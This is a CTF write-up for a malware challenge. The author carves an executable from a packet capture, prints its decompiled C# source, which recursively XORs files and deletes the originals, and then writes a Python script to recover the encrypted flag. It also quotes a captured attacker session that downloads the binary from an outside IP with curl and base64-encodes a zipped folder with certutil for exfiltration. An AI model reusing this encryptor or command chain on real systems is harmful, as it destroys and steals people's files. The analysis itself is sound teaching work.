---
title: "OSU League 2020/2021 - Snowcone Writeup"
date: 2021-02-01
draft: false
description: ""
tags: ["ctf"]
---
> Another day, another intrusion here at IcyRetina. Can you help recover the encrypted files APT42 stole from this victim?

The catagory of this challenge is malware. To start, we are given a pcapng file named `snowcone`. Opening this up in Wireshark we are able to see an interesting http stream with the info of `GET /snowcone.exe HTTP/1.1`.  

{{< figure src="/img/wireshark_1.png" >}}

Exporting this stream as an http object will allow us to get the file. So after going to file -> export objects -> http, we are able to download the executable.

Now, I really didn't want to run this on my machine, as it is literally a piece of malware, so I instead went with some static analysis. I used `dnSpy`, as was reccomended for decompilation, and looking at the code we can start to get an understanding of what it's doing.

To start, let's look at main:

```cpp
using System;
using System.Text;
using Snowcone.Properties;

namespace Snowcone
{
	// Token: 0x02000004 RID: 4
	internal class Program
	{
		// Token: 0x06000009 RID: 9 RVA: 0x00002290 File Offset: 0x00000490
		private static void Main(string[] args)
		{
			if (!SnowHelper.WillItSnow())
			{
				Console.WriteLine("it's not going to snow here :(");
				return;
			}
			if (args.Length == 0)
			{
				Console.WriteLine("lol you forgot how to make it snow!");
				Console.WriteLine("usage: snowcone.exe [dir [dir [dir [...]]]");
				return;
			}
			SnowMachine.OTP(Encoding.ASCII.GetBytes(Resources.key));
			for (int i = 0; i < args.Length; i++)
			{
				SnowMachine.MakeItSnow(args[i]);
			}
		}
	}
}
```

We can see here that the program checks to see if the function `WillItSnow()` returns true.  If it doesn't, then the program exits. It seems that all `WillItSnow()` does is check to see if the user's host name is equal to the one listed in the excecutable's resources.

```cpp
public static bool WillItSnow()
{
	return Dns.GetHostName() == Resources.host;
}
```

Since our hostname isn't what is listed in the program, we know that this program won't work on our machine, as it will just instantly return due to a mismatch. But let's keep going.  Next the program just checks to see if the user didn't supply any arguments, and if they didn't, then return.  The last bit here is where it gets juicy.  The function `SnowMachine.MakeItSnow(args[i]);` is called.

```cpp
public static void MakeItSnow(string dir)
{
	string[] array = Directory.GetFiles(dir);
	for (int i = 0; i < array.Length; i++)
	{
		SnowMachine.SmallSnowcone(array[i]);
	}
	array = Directory.GetDirectories(dir);
	for (int i = 0; i < array.Length; i++)
	{
		SnowMachine.MakeItSnow(array[i]);
	}
}
```

Now what does this function do? Well, it takes a directory, and then recursivley traverses that directory, calling the function `SmallSnowcone()` on every single file it encounters. Knowing this is malware, we can probably already take a guess as to what it might be doing to those files, but let's keep digging.

```cpp
private static void SmallSnowcone(string path)
{
	if (path.EndsWith(".sn0w"))
	{
		return;
	}
	using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read))
	{
		using (FileStream fileStream2 = new FileStream(path + ".sn0w", FileMode.Create, FileAccess.Write))
		{
			byte[] array = new byte[fileStream.Length];
			byte[] array2 = new byte[fileStream.Length];
			fileStream.Read(array, 0, (int)fileStream.Length);
			string text = SnowMachine.PickSomeFlavoring();
			SnowMachine.SaltBaeDatFlavorIn(array, array2, text);
			byte[] array3 = SnowMachine.OTP(Encoding.ASCII.GetBytes(text));
			for (int i = 0; i < 32; i++)
			{
				fileStream2.WriteByte(Convert.ToByte((int)(array3[i] | 128)));
			}
			fileStream2.Write(array2, 0, array2.Length);
		}
	}
	File.Delete(path);
}
```

`SmallSnowcone()` is definitely the meat of our program here.  It takes in a path to a file, does some funky encryption to said file, and saves it with the extention `.sn0w` while deleting the original unencrypted file. This is probably the function that we are going to try and reverse. But what are we reversing it for? Surely we must be trying to decrypt some flag. Maybe looking back at the TCP stream could give us a hint.

Opening up Wireshark again, I took a look at on of the TCP streams and followed it.

```
C:\Users\Administrator>curl http://54.202.2.132:7331/snowcone.exe > snowcone.exe
curl http://54.202.2.132:7331/snowcone.exe > snowcone.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100  8192  100  8192    0     0   8192      0  0:00:01 --:--:--  0:00:01 8000k

C:\Users\Administrator>.\snowcone.exe super_sensitive_documents
.\snowcone.exe super_sensitive_documents

C:\Users\Administrator>tar -acf exfil.zip super_sensitive_documents
tar -acf exfil.zip super_sensitive_documents

C:\Users\Administrator>certutil -encode exfil.zip exfil.zip.b64
certutil -encode exfil.zip exfil.zip.b64
Input Length = 281020
Output Length = 386462
CertUtil: -encode command completed successfully.

C:\Users\Administrator>type exfil.zip.b64
type exfil.zip.b64
-----BEGIN CERTIFICATE-----
UEsDBBQAAAAAAEQBO1IAAAAAAAAAAAAAAAAaACAAc3VwZXJfc2Vuc2l0aXZlX2Rv
Y3VtZW50cy9VVA0AB2GvEGBhrxBgRawQYHV4CwABBAAAAAAEAAAAAFBLAwQUAAgA
                        ...
bHNlY3VyaXR5Y2FyZC5qcGcuc24wd1VUDQAHYa8QYGGvEGBhrxBgdXgLAAEEAAAA
AAQAAAAAUEsFBgAAAAAEAAQA2QEAAM1HBAAAAA==
-----END CERTIFICATE-----
```

We are given a lot of information here, so let's take a look at it command by command.  First, we see that the user downloaded the piece of malware using curl. They then ran the program with the directory `super_sensitive_documents` as input.  As we know from the code, this directory is now surely encrypted.  The user then zips the directory, and encodes it with base 64 to create a certificate representation of it.  Knowing this, we can recover the encoded directory by just decoding the base 64, which would leave us with the original `.zip`.

After doing this, we can see the contents of `super_sensitive_documents`:

```
$tree super_sensitive_documents
super_sensitive_documents/
├── flag.txt.sn0w
├── passport.jpg.sn0w
└── socialsecuritycard.jpg.sn0w

$hexdump super_sensitive_documents/flag.txt.sn0w
0000000 f0b3 8aad ac86 f2f3 8190 98ac a7ad a489
0000010 b8ae aafb a186 a8f0 b2ad b381 f1b4 888f
0000020 411e 331a 0875 596e 1c26 6a0a 165c 3225
0000030 4f33 0757 3c33 0703 3730 3f2c 0718 3912
0000040 5704 3b30 030b 5202 2762 2717
000004c
```

Perfect.  There is our flag.txt.sn0w, and as expected it has been encrypted to a bunch of gibberish.  Now that we have a file we want to decrypt, let's go back to reversing that `SmallSnowcone()` function.  

```cpp
private static void SmallSnowcone(string path)
{
	if (path.EndsWith(".sn0w"))
	{
		return;
	}
	using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read))
	{
		using (FileStream fileStream2 = new FileStream(path + ".sn0w", FileMode.Create, FileAccess.Write))
		{
			byte[] array = new byte[fileStream.Length];
			byte[] array2 = new byte[fileStream.Length];
			fileStream.Read(array, 0, (int)fileStream.Length);
			string text = SnowMachine.PickSomeFlavoring();
			SnowMachine.SaltBaeDatFlavorIn(array, array2, text);
			byte[] array3 = SnowMachine.OTP(Encoding.ASCII.GetBytes(text));
			for (int i = 0; i < 32; i++)
			{
				fileStream2.WriteByte(Convert.ToByte((int)(array3[i] | 128)));
			}
			fileStream2.Write(array2, 0, array2.Length);
		}
	}
	File.Delete(path);
}
```

So, we can see that our file is placed into the byte array `array`. After that, we have a string `text` which set to whatever is returned from `PickSomeFlavoring()`.  

```cpp
private static string PickSomeFlavoring()
{
	string text = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	string text2 = "";
	using (RNGCryptoServiceProvider rngcryptoServiceProvider = new RNGCryptoServiceProvider())
	{
		for (int i = 0; i < 32; i++)
		{
			byte[] array = new byte[1];
			rngcryptoServiceProvider.GetBytes(array);
			text2 += text[(int)array[0] % text.Length].ToString();
		}
	}
	return text2;
}
```

This function creates a 32 random character string using `RNGCryptoServiceProvide`, so there is no breaking that for now. The random string is returned and set to `text`.  

Next, `SnowMachine.SaltBaeDatFlavorIn(array, array2, text);` is called.

```cpp
private static void SaltBaeDatFlavorIn(byte[] file, byte[] snow, string flavor)
{
	for (int i = 0; i < file.Length; i++)
	{
		snow[i] = Convert.ToByte((int)((char)file[i] ^ flavor[i % 32]));
	}
}
```

This just performs a bitwise XOR on each byte of the file with each byte of the random string `text`. This new encrypted string of bytes is now stored in `array2`, where it continues to be encrypted.

Next thing to happen in our `SmallSnowcone()` function is the creation of `array3`, which is set from calling the function `OTP()`

```cpp
public static byte[] OTP(byte[] input)
{
	byte[] array = new byte[input.Length];
	for (int i = 0; i < input.Length; i++)
	{
		array[i] = Convert.ToByte((int)(input[i] ^ 66));
	}
	return array;
}
```

This function just XORs each byte with 66, and stores the result in `array3`

Finally, our `SmallSnowcone()` function performs a bitwise OR operation on each byte in `array3` with the value `128`, which is then what is finally written to the `.sn0w` file.

Great! Now that we know exactly how our files are being encrypted, we should be able to work backwards to decrypt the file. The first thing to undo is the bitwise OR operation. What's interesting about this is that it is done with `128`, or `10000000` in binary.  This means only the most significant bit is being ORed.  Since we know that our key which we are trying to decrypt is all ASCII, and since we know that ASCII value `127` is the max, we know that the most significant bit is never going to be set.  So the value that was ORed with had to have a significant bit of 0.  

So we know that the significant bit of each byte of the key is 0. The next step is to undo the XOR operation with 66. Since XOR is its own inverse, we can just take the XOR of each byte of our encrypted array with 66 and we will get the key!

Doing this yeilds a key of `q2oHDn10RCnZoeKflz9hDc2jopCqv3MJ`

Now we can run through our encrypted file and XOR each byte with the corresponding values of our key. This will result in the original unencrypted file!

Let's script it out in python:

```python
enc_flag = open("./flag.txt.sn0w", 'rb')
contents = enc_flag.read()

xored = contents[:32] 

key = ""

for byte in xored:
    key += chr((byte & 0x7f)^66)  # (01111111 & 10110011) ^ 01000010 = key

contents = contents[32:]
output = bytes()

for i in range(len(contents)):
    output += bytes([contents[i] ^ ord(key[i % 0x20])])

print(output)
```

And running it we get the flag! 

```
osu{1f_it_d03snT_5now_1m_GoNn4_sue_sOm3b0dy}
```
